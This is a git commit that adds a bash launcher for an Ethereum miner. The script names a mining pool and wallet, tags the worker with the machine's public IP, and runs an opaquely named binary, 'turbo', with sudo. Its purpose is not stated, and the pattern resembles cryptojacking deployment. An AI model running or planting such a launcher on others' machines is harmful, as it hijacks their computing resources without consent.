070ab52be00010a523e0a68e9c54a6925cb359b5
Andalatia <105369674+Andalatia@users.noreply.github.com>
2022-05-11 21:01:49 +0700

    Add files via upload

---
+++ turbosh.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=stratum+tcp://eth-pool.beepool.org:9530
+WALLET=langitterang
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+
+cd "$(dirname "$0")"
+
+chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
